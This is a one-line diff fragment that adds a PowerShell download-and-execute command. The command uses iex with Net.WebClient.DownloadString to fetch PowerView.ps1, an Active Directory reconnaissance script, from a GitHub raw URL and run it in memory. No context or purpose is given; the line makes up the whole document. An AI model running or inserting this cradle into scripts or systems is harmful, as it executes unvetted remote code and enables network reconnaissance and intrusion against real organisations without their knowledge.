@@ -1,0 +1,1 @@
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NexonSecurity/scripts_public/main/PowerView.ps1')
